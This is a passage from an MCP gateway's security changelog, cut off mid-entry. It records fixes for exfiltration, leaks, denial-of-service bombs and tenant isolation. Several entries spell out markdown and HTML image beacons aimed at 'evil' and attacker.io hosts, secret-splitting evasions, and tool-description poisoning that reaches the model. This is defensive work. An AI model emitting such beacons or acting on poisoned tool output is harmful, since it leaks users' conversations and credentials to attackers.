    5 + 1558 gateway passed 0 failed; broker 108. Evidence mcp-parallel/findings/backstop-p-ext-withhold-audit/.
    RESIDUAL: domain-not-allowlisted 403 (before _ext_audit def, static input reject) left unaudited by design.
  - CHG-0096 (2026-07-03) — HIGH zero-click exfil: MCP tool RESULTS were not defanged for auto-render exfil
    BEACONS. The chat guard defangs markdown-image ![x](https://evil/?d=<data>) / bare beacon URLs via
    neutralize_exfil_channels, but the MCP result scan (orchestrator _scan_text_tier1) only ran redact_all —
    masking recognized PII/secrets but NOT the beacon STRUCTURE. A malicious upstream result with
    ![x](https://evil/?d=<b64-of-conversation>) (opaque payload the regexes miss) egressed as a live
    auto-render beacon a markdown client AUTO-FETCHES on render → zero-click exfil; this egress BYPASSES the
    chat output guard (separate API surface). FIX: (1) _scan_text_tier1 runs neutralize_exfil_channels on the
    RAW text (before redact_all so the payload is visible to _url_smuggles_data), adds an 'exfil' finding, sets
    mutation to redact_all(neutralized) or neutralized; gated enforcement != monitor. (2) tier1 only applies a
    mutation under redact, so added _findings_have_exfil + OR'd into the E12 floor's redact-trigger at all 3
    sites (mcp_proxy.py) — CHG-0074 pattern — so defang fires under the default 'tag' posture. NEW TEST
    test_mcp_result_exfil_beacon_defang.py (10). Gate: 10 + 1568 gateway passed 0 failed; broker 108. Byte-level:
    ![a](.../?leak=john.doe@corp.example) -> [a](https://attacker.io/[exfil-redacted]); 5 benign unchanged.
    ORACLE NOTE: aidefence blind here (rated raw ?leak=<email> beacon hasPII=false — doesn't parse PII in URL
    query); byte-level + behavior test authoritative. Evidence mcp-parallel/findings/backstop-p-result-exfil-
    beacon/. RESIDUAL: HTML <img>/srcset nested in a JSON result field NOT defanged (whole-payload JSON scan
    escapes the attribute quotes; HTML regexes miss them) — markdown/bare-URL ARE defanged; per-field
    neutralization is a future item. → CLOSED by CHG-0097.
  - CHG-0097 (2026-07-03) — HIGH zero-click exfil, CLOSES the CHG-0096 residual: HTML/SVG/CSS/srcset exfil
    beacons NESTED in a JSON tool-result field. The MCP tier-1 target (target_mode=entire) is the whole
    payload JSON-serialized, so HTML attr quotes are escaped (src=\"...\") and neutralize_exfil_channels's HTML
    regexes (expecting real quotes) miss them; markdown survived (no quotes) and defanged, HTML did not. FIX:
    _neutralize_exfil_deep(text) (mcp_scan_orchestrator.py) — if the target is JSON, parse it, neutralize each
    UNESCAPED string LEAF, re-serialize (HTML/srcset/CSS/SVG defang correctly, valid JSON escaping preserved);
    non-JSON neutralized directly; returns original unchanged when nothing defanged (benign byte-identical).
    _scan_text_tier1 calls it instead of neutralize_exfil_channels (CHG-0096 finding+floor wiring unchanged).
    +8 tests (HTML img/srcset/CSS/SVG defanged; 3 benign HTML images untouched; helper unit incl malformed-JSON
    fallback). Gate: 18 + 1576 gateway passed 0 failed; broker 108. Byte-level: <img src="https://evil/?d=<b64>">
    -> <img src=\"[exfil-redacted]\">; benign cdn img unchanged. Evidence mcp-parallel/findings/backstop-p-
    result-exfil-html-nested/. The MCP result path now defangs markdown/bare-URL/protocol-relative/HTML-media/
    srcset/CSS-url/SVG-href zero-click beacons (chat-guard parity).
  - CHG-0098 (2026-07-03) — HIGH fail-open 1.4 leak: ext-proxy NON-FINITE SSE stream (server notifications)
    egressed UNSCANNED. ext_mcp_proxy buffers+scans SSE only for finite methods; a non-finite stream
    (notifications/*, subscribe, long-lived) was forwarded RAW (stream_gen yielded aiter_bytes verbatim, only a
    LOG.warning) because buffering an open stream could hang/OOM — but an untrusted upstream can push sensitive
    data in a notifications/message params, so it was a real unbounded egress leak (last unscanned MCP egress).
    FIX: scan PER EVENT with bounded memory. _scan_reframe_sse_tool_result gained scan_notifications (a
    notification frame — no result/error, has params — gets its whole message scanned via the floor, reusing
    CHG-0093 reassembly). The non-finite branch buffers only up to ONE event (cap _MCP_SSE_EVENT_MAX_BYTES=1MB,
    env), scans+re-emits; an over-cap unterminated event is WITHHELD fail-closed; a blocked event withheld via
    SSE comment, stream continues. Audited (sse_stream_scanned / sse_stream_event_withheld / _too_large). NEW
    TEST test_mcp_ext_sse_stream_scan.py (5); updated test_mcp_bare_proxy_scan.py's obsolete passthrough test
    (another session's) to assert the scanned behavior. Gate: 5 + 1581 gateway passed 0 failed; broker 108.
    Byte-level: notification secret+PII+IP -> AKIA****MPLE / b***@c***.example; benign progress unchanged.
    Independent oracle (aidefence): has_pii false masked / true raw. Evidence mcp-parallel/findings/backstop-p-
    ext-sse-stream-scan/. Cross-EVENT splits don't reassemble client-side, so per-event scanning suffices.
  - CHG-0099 (2026-07-03) — HIGH fail-open 1.4 leak: markdown-split / encoded PII-secret in MCP tool results
    evaded the scanner. The chat output guard applies THREE render-leak neutralizers (neutralize_exfil_channels
    -> neutralize_encoded_pii -> neutralize_markdown_split_pii G44); CHG-0096 wired only the FIRST into the MCP
    result path. So a PII/secret with chars interleaved by inline markdown emphasis/code/HTML (1**2**3-45-6789,
    AKIA**IOSFODNN7**EXAMPLE, 4111**-1111-1111-**1111, 1&#50;3-45-6789) evaded the raw regexes (tags=[]) yet a
    markdown client STRIPS the emphasis on render and reconstructs the value -> real leak. FIX: _neutralize_
    render_leaks(text) composes all 3 (same order as sanitize_output_for_verdict); _neutralize_exfil_deep (the
    CHG-0097 JSON-leaf walker) calls it per leaf, so exfil beacons AND markdown-split/encoded PII nested in a
    JSON field are neutralized. Masked run -> [PII_REDACTED]; finding drives the E12 floor under default 'tag'.
    Strict no-op on benign markdown (**bold**, 2*3, `code`, a_b_c). +9 tests (5 md/encoded-split masked + 4
    benign untouched; all exfil-beacon tests pass). Gate: 27 + 1594 gateway passed 0 failed; broker 108.
    Byte-level: "The SSN is 1**2**3-45-6789 exactly" -> "The SSN is [PII_REDACTED] exactly". Independent oracle
    (aidefence on RENDERED view): has_pii true rendered-raw / false rendered-fixed. Evidence mcp-parallel/
    findings/backstop-p-result-markdown-split-pii/. The MCP result egress now has FULL chat-guard render-leak
    parity. RESIDUAL: secret SPLIT ACROSS content-array items (client-concat-dependent) — future item.
    -> CLOSED by CHG-0100.
  - CHG-0100 (2026-07-03) — MEDIUM-HIGH fail-open 1.4 leak (client-concat-dependent): secret SPLIT ACROSS
    content-array items evaded the tool-result scan. A malicious upstream splits a secret so each half is a
    benign sub-pattern in adjacent content blocks (…AKIAIOSFOD / NN7EXAMPLE…); the whole-payload scan sees the
    halves separated by JSON structure so the value is never contiguous (tags=[]), yet a client that
    CONCATENATES the text blocks reconstructs it. FIX (mcp_proxy.py): _scan_tool_result_floor runs a cross-block
    check (unless per-tool monitor wins) — _result_has_split_secret concatenates all content-block text + scans
    for HIGH-CONFIDENCE secrets/credentials (detect_secrets + detect_credential_exposure + SECRET-tagged
    detect_pii); a kind in the concatenation but NOT wholly inside any single block was reconstructed only by
    the join -> fail CLOSED (block). Scoped to secrets/credentials (not generic PII) -> negligible FP;
    contiguous secret in one block left to the normal floor (no over-block). +8 tests (split-2/3 blocked;
    contiguous redacted-not-blocked; benign multi-block passes; single block; monitor observe-only; 2 helpers).
    Gate: 8 + 1602 gateway passed 0 failed; broker 108. BLOCK decision (aidefence-as-oracle N/A). Evidence
    mcp-parallel/findings/backstop-p-result-cross-block-split/. Completes the split-evasion family (SSE CHG-0093,
    markdown CHG-0099, content-array CHG-0100).
  - CHG-0101 (2026-07-03) — item-20 concurrency dimension (verification + regression-lock, ZERO defects):
    CHG-0090 proved the plaintext-redaction chain concurrency-safe but predates the render-leak neutralization
    (CHG-0096/0097/0099 exfil beacons + markdown-split/encoded PII) and the cross-block split-block (CHG-0100),
    which run in the HOT scan path. NEW TESTS (test_mcp_scan_concurrency_safety.py, +2): 300 concurrent
    _scan_tool_result_floor across 10 orgs — (1) each w/ a UNIQUE benign token + UNIQUE base64 exfil beacon +
    markdown-split secret -> token survives, beacon defanged, markdown-split does NOT reconstruct, 0
    cross-contamination; (2) each w/ a valid AWS key split across 2 content blocks -> ALL 300 blocked. RESULT:
    0/0/0/0 + 300/300 blocked -> the CHG-0096-0100 guardrails are stateless/isolation-safe under concurrency.
    Gate: 4 (2+2) + 1604 gateway passed 0 failed; broker 108. Evidence mcp-parallel/findings/backstop-p20-
    render-leak-concurrency/. HONESTY: proves concurrency-safety, NOT the full 300-500-sandbox live stress
    (host-blocked, owned by CP47-50).
  - CHG-0102 (2026-07-03) — MEDIUM DoS-amplification SELF-CORRECTION (item 16 resource-bombs): a resource-bomb
    probe found the scan fails CLOSED on a JSON bomb (deeply-nested -> SCAN_ERROR block) but my CHG-0100
    split-check added ~3s (33%) to a 5MB multi-block result — it concatenated ALL content-block text and ran 3
    detect passes over the full O(total_text) concat. Under 5k-10k concurrent that's a real DoS vector.
    FIX (mcp_proxy.py): a secret is short so a cross-block split only spans a boundary within
    _MCP_SPLIT_SECRET_SPAN (default 512, env); _boundary_concat trims each block to its boundary regions (block
    <=2*span kept whole; longer block keeps first-span + \n\x00\n sentinel + last-span, dropping the interior
    which the full-text scan already covers); _result_has_split_secret scans that -> O(num_blocks*span). +1
    test. Perf: 5MB multiblock split-check 3.03s -> 0.378s (~8x). Correctness unchanged (2-way/3-way/huge-left
    splits caught; contiguous-in-interior not falsely flagged). Gate: 9 + 1605 gateway passed 0 failed; broker
    108. Evidence mcp-parallel/findings/backstop-p16-split-check-dos-bound/. RESIDUAL: a >512-char secret split
    into a long block's trimmed interior could be missed (extreme; span env-tunable; full-text scan catches
    contiguous). Pre-existing ~10s detect on a 9MB single block is a separate product-level trade-off, unchanged.
  - CHG-0103 (2026-07-03) — HIGH availability/DoS: the MCP Tier-1 scan BLOCKED the event loop under load.
    _scan_text_tier1 (mcp_scan_orchestrator.py) was async but its body is PURE SYNC CPU (detect_pii/secrets/ip/
    cred loops of re.search + redact_all + encoded-exfil loop + render-leak neutralizers), NO await -> ran
    INLINE on the loop. A large tool result (up to 10MB) is seconds of CPU (detect_pii ~2.6s on 8MB; whole
    tier1 ~5-10s) -> BLOCKS the loop, freezing EVERY concurrent request on the worker. Measured: 8MB scan
    stalled a trivial sleep(0.05) coroutine 9.67s. An untrusted upstream triggers it with one crafted result.
    FIX: split into pure-CPU sync _scan_text_tier1_sync (unchanged body) + async wrapper _scan_text_tier1 (same
    signature) that offloads to a thread via asyncio.to_thread when text > _TIER1_OFFLOAD_THRESHOLD (64KB, env
    MCP_TIER1_OFFLOAD_BYTES); small inputs inline. re loop releases the GIL between patterns -> loop responsive.
    After: 8MB scan stalls only ~0.2s; secret still masked (correctness through thread). +4 deterministic tests.
    Gate: 4 + 1609 gateway passed 0 failed; broker 108. Pre-existing gap (chat scanner already offloads via
    run_in_executor; MCP tier1 did not). Evidence mcp-parallel/findings/backstop-p16-tier1-event-loop-block/.
    RESIDUAL: total CPU cost of a 9MB scan (~10s) unchanged — no longer blocks the loop; capping is separate.
  - CHG-0104 (2026-07-03) — MEDIUM resource-bomb (item 16): content-block-count limit missing. The 10MB byte
    cap does NOT stop a many-tiny-block bomb (~50k blocks x ~200B = ~3-10MB, UNDER the byte cap) that amplifies
    per-block loop cost (JSON serialize, scan-target extraction, tool filtering) and stalled the loop ~0.8s
    (the residual after CHG-0103; not the detect scan (offloaded) nor the split-check (a warm A/B showed
    offloading it made no difference), but the inline many-object JSON/loop overhead). FIX (mcp_proxy.py):
    _scan_tool_result_floor fails CLOSED when a result has > _MCP_MAX_CONTENT_BLOCKS (default 10000, env
    MCP_MAX_CONTENT_BLOCKS) blocks — O(1) len() check BEFORE the expensive scan, so a bomb costs nothing.
    monitor observe-only; handles {"content":[…]} + bare list. +7 tests. Behavior: 50k-block bomb -> blocked
    dt=0.000s, loop gap 0.000s (was ~0.8s). Gate: 7 + 1620 gateway passed 0 failed; broker 108. Evidence
    mcp-parallel/findings/backstop-p16-content-block-count-cap/. HONESTY: first tried offloading the split-check
    (like CHG-0103) but a warm A/B showed no benefit (0.80 inline vs 0.84 offloaded) -> REVERTED, landed on the
    block-count cap. No content leak -> no aidefence oracle.
  - CHG-0105 (2026-07-03) — HIGH fail-open 1.4 leak: internal (chat->MCP) route returned stdio/websocket tool
    RESULTS UNSCANNED. internal_tools_call (the X-Gateway-Internal-Key route the chat pipeline uses to run an
    MCP tool for a user) scans the RESULT only on the streamable-http path (_scan_internal_result); on the
    SANDBOX transports (stdio/websocket, _is_sandbox_routed) it returned the raw _adapter_forward response
    DIRECTLY -> a secret/PII/IP/exfil-beacon/markdown-split value in a stdio/ws tool result egressed to the
    chat pipeline -> LLM UNREDACTED, while the same tool via org_mcp_jsonrpc IS scanned. Confirmed: a stdio
    result with AKIAIOSFODNN7EXAMPLE + bob@corp.example + ![x](https://evil…) egressed all three raw. FIX
    (mcp_proxy.py): the sandbox branch buffers the adapter response + (error-envelope aware, CHG-0091) scans
    the whole result OR a bare error envelope via _scan_tool_result_floor (all hardened machinery: redaction +
    render-leak neutralization + split-check + block-count cap); swaps masked result, fails CLOSED on
    unmaskable survivor, audits block/redact (transport=internal_sandbox). NEW TEST
    test_mcp_internal_sandbox_result_scan.py (5). Gate: 5 + 1625 gateway passed 0 failed; broker 108.
    Byte-level: alice.jones@corp.example / 123-45-6789 -> a***@c***.example / ***-**-6789. Independent oracle
    (aidefence): has_pii false fixed / true raw. Evidence mcp-parallel/findings/backstop-p-internal-sandbox-
    result-unscanned/. RESIDUAL: the internal streamable-http _scan_internal_result scans only result.content
    (not a bare error frame / structuredContent) — narrower than the sandbox complete-skip; follow-up -> CHG-0106.
  - CHG-0106 (2026-07-03) — MEDIUM fail-open 1.4 leak (legacy fallback): closes the CHG-0105 residual. The
    internal route's LEGACY direct-httpx path (_scan_internal_result, reached only when MCP_HTTP_VIA_SANDBOX=0;
    default routes ALL transports through the sandbox = CHG-0105) scanned only result.content. If result.content
    was None it returned the reply UNSCANNED -> a secret/PII/internal-IP in an upstream JSON-RPC error frame
    (error.message) or a structuredContent-only result egressed RAW to the chat pipeline -> LLM. Byte-verified
    pre-fix: error frame AKIAIOSFODNN7EXAMPLE + 10.1.2.3 + bob.jones@corp.example egressed all three raw;
    structuredContent-only AWS key + SSN egressed both. It also silently swapped masked content with NO audit.
    FIX (mcp_proxy.py): error-envelope aware WHOLE-result scan (mirrors sandbox CHG-0105 + org CHG-0091) — scans
    resp["result"] when present (content AND structuredContent AND bare string/list) else the bare error envelope
    via _scan_tool_result_floor; masks/blocks + AUDITS the redact (decision=redact, transport=internal), closing
    the audit omission. NEW TEST test_mcp_internal_http_result_scan.py (5). Gate: 5 + 1649 gateway passed 0
    failed; broker 108. Byte-level (MCP_HTTP_VIA_SANDBOX=0): error frame -> key=AKIA****MPLE host
    [INTERNAL_IPV4_REDACTED] user b***@c***.example; structuredContent -> "secret":"***","ssn":"***-**-6789".
    Independent oracle (aidefence): has_pii true raw / false fixed. Evidence mcp-parallel/findings/backstop-p-
    internal-http-result-scan/. Result-egress redaction now at full parity across org / sandbox / legacy-httpx.
  - CHG-0107 (2026-07-03) — MEDIUM 1.4 credential leak to OPERATOR LOGS (both consumers): closes the CHG-0053
    follow-up. The stdio-spawn log line logged args carrying secrets. (a) CHG-0053 masked secret-FLAG values
    (--token X) but only on the sandbox agent; a credential embedded in a URL passed as a STANDALONE arg
    (postgres://u:pw@h/db, https://x-access-token:ghp_..@github, https://h/mcp?api_key=..&token=..) egressed RAW.
    (b) the GATEWAY adapter (mcp_stdio_adapter.py:426) logged args with NO masking at ALL. Byte-verified pre-fix:
    all four URL-cred forms + --token XYZ egressed verbatim (gateway); the four URL forms egressed (sandbox). FIX:
    ONE hardened _safe_args_for_log now lives in shared/ai_mesh_shared/mcp_stdio_common.py (imported by BOTH the
    gateway adapter and the vendored sandbox agent) — masks secret-flag values AND, via _redact_url_creds, the
    WHOLE URL userinfo (scheme://***@host) + secret-named query-param values (?api_key=***&token=***&page=2,
    non-secret preserved); fail-safe (never raises). The sandbox agent's local CHG-0053 copy was deduped into
    shared. NEW/UPDATED TESTS: shared +12 (test_stdio_common.py), sandbox agent +2, gateway +1. Gate: 12 shared +
    120 broker + 33 sandbox-agent + 1663 gateway passed, 0 failed. Byte-level: postgres://admin:S3cr3tPass@... ->
    postgres://***@...; ?api_key=AKIA..&token=abc&page=2 -> ?api_key=***&token=***&page=2; benign URL/pkgspec/flag
    controls correct. Independent oracle (aidefence_scan): piiFound true raw / false masked (blind to AWS-key/URL-
    query class -> byte-level authoritative; masking uses urlsplit, independent of the detection regexes). Evidence
    mcp-parallel/findings/backstop-p13-stdio-arg-url-cred-log-leak/. One log-hygiene helper, both deployables.
  - CHG-0108 (2026-07-03) — MEDIUM-HIGH 1.4 leak + tool-poisoning: internal tool-DISCOVERY route returned
    upstream tools/list metadata UNSCANNED. internal_discover_tools (the X-Gateway-Internal-Key route the backend
    uses to SYNC an MCP server's tool catalog) returned the upstream tools/list RAW on BOTH paths (sandbox
    _adapter_forward; direct-httpx json.loads/tools_resp.json). Tool descriptions/names/inputSchema come LIVE from
    an untrusted upstream, synced into the catalog + shown to the model -> a secret/PII/internal-IP (or encoded-
    exfil) in a description egressed to backend/LLM unredacted, while org_mcp_jsonrpc (CHG-0077/0092), REST
    (CHG-0079), and the ext-proxy all scan tool metadata. Byte-verified pre-fix: desc AKIAIOSFODNN7EXAMPLE +
    bob.jones@corp.example + 10.9.8.7 egressed all three raw on both paths. FIX (mcp_proxy.py): new
    _scan_internal_tools_list scans the discovered payload — tools-shaped -> _scanned_tools_list_response (mask
    maskable / fail-closed BLOCK poisoned/unmaskable / audit); bare error envelope -> _scan_tool_result_floor
    (CHG-0092 parity) + audit; wired into all 3 return points; fetches enabled_info (respects monitor override);
    actor=None (descriptions not actor-scoped). NEW TEST test_mcp_internal_discover_tools_scan.py (5). Gate: 5 +
    1668 gateway passed 0 failed; broker 120 (unaffected). Byte-level: Contact bob.jones@corp.example key
    AKIAIOSFODNN7EXAMPLE host 10.9.8.7 -> b***@c***.example key AKIA****MPLE host [INTERNAL_IPV4_REDACTED];
    poisoned .ssh/id_rsa desc -> tools/list withheld. Oracle (aidefence): has_pii true raw / false masked.
    Evidence mcp-parallel/findings/backstop-p-internal-discover-tools-unscanned/. tools/list scanning now at full
    parity across org-jsonrpc / REST / ext-proxy / internal-discovery.
  - CHG-0109 (2026-07-03) — LOW-MED audit-completeness (tag-inputs->audit): INBOUND arg redaction was not audited
    on the internal / bare-REST / ext paths. When tool ARGUMENTS carry PII/IP the gateway MASKS (scan_action=
    redact, not a hard block) before forwarding, the main org_mcp_jsonrpc path folds it into its per-call
    _was_redacted event, but internal_tools_call / org_mcp_tool_call / ext_mcp_proxy swapped the masked args in
    SILENTLY (no _record_gateway_event) -> the INPUT redaction was invisible to audit/SIEM, asymmetric with the
    block branch (pii_blocked_inbound) + the result-side redact audits (CHG-0081/0106). Byte-proven: a redact-
    configured server masked bob.jones@corp.example -> b***@c***.example in the forwarded args, ZERO events. FIX
    (mcp_proxy.py): the 3 paths now record decision=redact reason=pii_redacted_inbound (tags+findings) on inbound
    redaction (not blocked); benign -> nothing; credential -> still block-not-redact. Ext edit is defense-in-depth
    parity (ext scans args enabled_info=None -> tag -> no inbound redaction today). NEW TEST
    test_mcp_inbound_redact_audit.py (5). Gate: 5 + 1673 gateway passed 0 failed; broker 120 (unaffected). NOT a
    leak (egress already redacted); audit-visibility fix. Oracle (aidefence): forwarded masked args has_pii false.
    Evidence mcp-parallel/findings/backstop-p-inbound-redact-audit/. Inbound-redact audit now at parity across all
    4 tool-call paths.
  - CHG-0110 (2026-07-03) — LOW-MED least-privilege/context-minimization: ext-proxy egress leaked client IP /
    internal topology / org slug to third-party servers. _ext_proxy_forward_headers (transparent EXTERNAL proxy
    outbound header set) is a DENYLIST — it stripped credentials (authorization/cookie/x-api-key, CHG-0033) +
    x-gateway-* + hop-by-hop, but forwarded EVERYTHING else. So request-routing/client-identity headers leaked to
    the untrusted third party: x-forwarded-for/x-real-ip (caller real IP + internal IP), x-forwarded-host/forwarded/
    via (internal gateway host + proxy chain), referer (internal URL + ORG/TENANT slug, e.g. https://gw.internal/
    org/demo/chat). Byte-verified pre-fix: 203.0.113.9 + 10.0.0.2 + gw.internal + org/demo all egressed. FIX
    (mcp_proxy.py): also drop _EXT_ROUTING_HEADERS (x-real-ip, forwarded, via, referer, referrer) + any x-forwarded-*
    (prefix). Third party now sees only content-type/accept/mcp-session-id/mcp-protocol-version/user-agent + the
    gateway's OWN injected upstream OAuth. Credential-stripping (CHG-0033) unchanged. NEW TEST (+1 in
    test_mcp_bare_proxy_scan.py). Gate: 3 forward_headers + 1682 gateway passed 0 failed; broker 120 (unaffected).
    NOT a credential leak (creds already stripped) -> privacy/topology/tenant-identity minimization; aidefence blind
    to IP/header class -> byte-level header-absence authoritative. Evidence mcp-parallel/findings/backstop-p-ext-
    egress-header-minimization/.
  - CHG-0111 (2026-07-03) — HIGH cross-tenant isolation break: broker org_slug sanitize-collision. The broker key
    (X-MCP-Broker-Key) is a SHARED secret (not per-org), so the path org_slug is the SOLE tenant selector.
    DockerManager LOSSILY sanitizes it for the container name (re.sub([^a-zA-Z0-9_.-] -> "-").strip("-") or
    "default") and find_container matches by NAME first; NO route validated the slug. So distinct slugs COLLIDE
    onto one container: acme/prod == acme-prod; -acme == acme- == acme; teñant == te-ant; empty/all-invalid ->
    default. A colliding slug on /rpc runs org B's call in org A's sandbox; DELETE destroys the wrong org's
    container; /status leaks another org's processes. FIX (services/mcp-broker/src/sandbox/routes.py): new
    _require_canonical_org_slug fails CLOSED (400) on any slug the sanitizer would alter (accept only sanitize(slug)
    ==slug, non-empty, <=64, no leading/trailing -); applied to /ensure /rpc /stdio/rpc /status DELETE. Encoded-slash
    slugs also 404 at routing. NEW TEST test_sandbox_org_slug_validation.py (26). Gate: 26 + 146 broker passed;
    gateway unaffected (posts over HTTP, supplies validated slugs). Oracle N/A (routing/isolation fix, no PII-text
    delta). Evidence mcp-parallel/findings/backstop-p-broker-org-slug-collision/.
  - CHG-0112 (2026-07-03) — MEDIUM-HIGH cross-tenant residual (completes CHG-0111): broker by-name container lookup
    didn't verify the org label. find_container calls get_container_by_name FIRST, which did a pure
    client.containers.get(container_name(slug)) with NO label check. The name comes from a LOSSY sanitizer, so a
    name match isn't proof of tenancy: a legacy/renamed container owning the name but with a DIFFERENT
    LABEL_ORG_SLUG would serve the WRONG org (e.g. a pre-CHG-0111 container for colliding slug acme/prod still
    owning ...-acme-prod, matched for canonical acme-prod). FIX (services/mcp-broker/src/sandbox/docker_manager.py):
    get_container_by_name now verifies LABEL_ORG_SLUG==slug AND LABEL_ROLE==mcp-sandbox (via new _container_labels
    helper); on mismatch logs + returns None (fail-closed) so find_container falls through to the authoritative
    label filter. Org LABEL is now the tenant key; name is only an optimization. +4 tests; the 2 broker mocks made
    realistic (real containers always carry these labels). Gate: 4 + 150 broker passed; gateway unaffected. Oracle
    N/A (routing/isolation fix). Evidence mcp-parallel/findings/backstop-p-broker-name-label-verify/.
  - CHG-0113 (2026-07-03) — LOW-MED cross-tenant residual (completes CHG-0112 for volumes): broker destroy removed
    the org VOLUME by name without label verification. CHG-0112 label-verified the CONTAINER (find_container), but
    destroy still removed the auth volume (/data/mcp-auth) purely by volume_name(slug) (lossy-sanitized) with NO
    label check; the volume was auto-created UNLABELED. A legacy/reused volume owning the canonical name but
    belonging to a DIFFERENT org (pre-CHG-0111 colliding slug) would be DESTROYED for the wrong org. FIX
    (services/mcp-broker/src/sandbox/docker_manager.py): (1) _ensure_volume explicitly creates the volume WITH
    labels(org_slug) before the container run (idempotent, best-effort); (2) destroy reads _volume_labels and
    REFUSES to remove a volume whose LABEL_ORG_SLUG differs from the requested org (fail-closed); unlabeled-legacy
    or same-org volumes still removed. Org LABEL is now the tenant key for the volume too. +5 tests. Gate: 8 volume
    + 155 broker passed; gateway unaffected. Oracle N/A. Evidence mcp-parallel/findings/backstop-p-broker-volume-
    label-verify/.
    AUDIT (verification-only, no code change): re-probed the other tenant-selector surfaces, all ALREADY hardened —
    gateway OAuth token store (org-prefixed clean-slug key; flow/callback/status org-scoped, one-time state, PKCE,
    token from trusted flow record, callback XSS-escaped); control-plane _request_org (tenant from authed profile OR
    secret-validated gateway-internal X-Org-Slug, client org NOT honored; MCPEvent sanitizes all channels); tool-call
    cap per-key. FLAGGED (not fixed — control-plane test env unavailable here: no venv, django/fakeredis not
    importable; and not reachable today): _gateway_request_org honors X-Org-Slug relying on the view permission gate
    rather than self-verifying the internal secret — defense-in-depth self-verify deferred to a gated iteration.
  - CHG-0114 (2026-07-03) — MEDIUM fail-open DoS: deep-nested JSON result crashed _neutralize_exfil_deep. The
    CHG-0097 render-leak neutralizer parses the WHOLE result JSON + walks it per string leaf, but _walk had NO depth
    bound. CPython json.loads PARSES thousands-deep JSON that the Python _walk then can't traverse (recursion limit
    ~1000) -> RecursionError; the try/except covered only json.loads, so it propagated to tier1 which SWALLOWED it,
    SILENTLY SKIPPING exfil-beacon/markdown-split neutralization for that result (fail-open of the CHG-0096-0099
    defense) + a per-call stack-exhaustion vector. Byte-verified: _neutralize_exfil_deep(json.dumps(nested(6000)))
    raised RecursionError. FIX (mcp_scan_orchestrator.py): _walk is depth-bounded (_MAX_EXFIL_WALK_DEPTH=200, env
    MCP_EXFIL_WALK_MAX_DEPTH) + the walk/dumps wrapped in try/except -> fall back to string-level neutralize. Deep
    results no longer crash NOR disable the defense; realistic shallow beacons still defanged. +6 tests. Gate: 33
    exfil + 1699 gateway passed 0 failed; broker unaffected. Oracle N/A (DoS + beacon-defang fix; no-RecursionError +
    beacon-absent byte assertions authoritative). RESIDUAL: a beacon nested past the 200 cap isn't per-leaf-defanged
    (not a realistic client auto-render vector; closing the stack-DoS is the priority). Self-correction of backstop
    CHG-0097. Evidence mcp-parallel/findings/backstop-p-exfil-deep-nest-dos/.
  - CHG-0115 (2026-07-03) — LOW-MED resource-bomb containment + monitor fix: proactive nesting-depth cap on tool
    RESULTS. A result STRUCTURE nested thousands deep makes the recursive scan hit Python's recursion limit (~1000)
    -> RecursionError; the floor's except already fail-CLOSED (safe, no leak) but (a) relied on catching a fragile
    mid-scan RecursionError (generic SCAN_ERROR) and (b) under a per-tool "monitor" action (observe-only, must NEVER
    block) the scan still ran, RecursionError'd, and fail-closed -> a WRONGFUL block violating monitor. FIX
    (mcp_proxy.py): new ITERATIVE _exceeds_nesting_depth (own stack -> guard can't itself be recursion-DoS'd) runs
    BEFORE the scan; past _MCP_MAX_RESULT_DEPTH (500, env MCP_MAX_RESULT_DEPTH) branches on action -> real action:
    fail-closed RESOURCE_LIMIT + result_too_deeply_nested; monitor: forward UNSCANNED (never block,
    monitor_scan_skipped). Deep results can't crash the scan, get a clear reason, monitor stays observe-only. +4
    tests. Gate: 11 block-count-cap + 1703 gateway passed 0 failed; broker unaffected. Oracle N/A (DoS containment,
    no PII-text delta). Extends CHG-0104 (block-count) / complements CHG-0114 (exfil-walk). Evidence mcp-parallel/
    findings/backstop-p-result-depth-cap/.
  - CHG-0116 (2026-07-03) — LOW-MED resource-bomb + monitor fix (INPUT-side twin of CHG-0115): proactive depth cap on
    inbound tool ARGS. CHG-0115 capped the RESULT floor, but _scan_tool_args_block (scans attacker-controlled tool-
    call ARGUMENTS) had none -> deep args RecursionError'd the input scan (caught as generic arg_scan_error; under a
    per-tool "monitor" action -> wrongful fail-closed block violating observe-only). FIX (mcp_proxy.py):
    _scan_tool_args_block runs the same iterative _exceeds_nesting_depth BEFORE the scan; past _MCP_MAX_ARG_DEPTH
    (defaults to _MCP_MAX_RESULT_DEPTH=500, env MCP_MAX_ARG_DEPTH) branches on action -> real action: fail-closed
    RESOURCE_LIMIT + args_too_deeply_nested; monitor: forward UNCHANGED (never block, monitor_scan_skipped). Deep args
    can't crash the scan, get a clear reason, monitor stays observe-only; credential force-block on shallow args
    unchanged. +3 tests. Gate: 14 resource-limit + 1706 gateway passed 0 failed; broker unaffected. Oracle N/A (DoS
    containment). Input-side twin of CHG-0115; parity with CHG-0104. Evidence mcp-parallel/findings/backstop-p-args-depth-cap/.
  - CHG-0117 (2026-07-03) — MEDIUM fail-open DoS: non-finite SSE stream had no TOTAL bound. The ext-proxy NON-finite
    SSE stream_gen (CHG-0098, server notifications/*subscribe) caps each EVENT at 1MB + never buffers the whole
    stream, but had NO cap on total bytes/events/duration -> an untrusted allowlisted upstream can stream an INFINITE
    sequence of small (<1MB) events forever (holds the connection, burns CPU scanning each, egresses unbounded;
    httpx per-read timeout won't stop a slow-steady infinite stream). FIX (mcp_proxy.py): stream_gen tracks
    total_bytes + event_count and, past _MCP_SSE_STREAM_MAX_BYTES (100MB, env MCP_SSE_STREAM_MAX_BYTES) or
    _MCP_SSE_STREAM_MAX_EVENTS (100000, env MCP_SSE_STREAM_MAX_EVENTS), CLOSES the stream fail-closed (yields ':
    [stream closed: resource limit]', audits sse_stream_limit_exceeded, returns -> finally aclose()s resp+client).
    Generous defaults >> any realistic notification feed; env-tunable. +3 tests. Gate: 8 ext-sse + 1709 gateway
    passed 0 failed; broker unaffected. Oracle N/A (DoS containment). Streaming-path twin of CHG-0104/0115/0116;
    extends CHG-0098. Evidence mcp-parallel/findings/backstop-p-sse-stream-total-bound/.
  - CHG-0118 (2026-07-03) — MEDIUM 1.4 leak + tool-poisoning: ext-proxy forwarded completion/complete +
    resources/templates/list results UNSCANNED. ext_mcp_proxy scans a result only when its method is in
    _EXT_FINITE_RESULT_METHODS; two finite server-controlled model/user-facing methods were MISSING -> raw:
    completion/complete (result.completion.values[] autocompletion strings shown to user/model) + resources/templates
    /list (result.resourceTemplates[].{name,description,uriTemplate} metadata, model-facing like resources/list which
    IS scanned). Same class as tools/list (CHG-0077) / initialize (CHG-0080). Byte-verified: completion.values with
    AKIAIOSFODNN7EXAMPLE + bob@corp.example and a template description with AKIA.. + 10.9.8.7 egressed raw. FIX
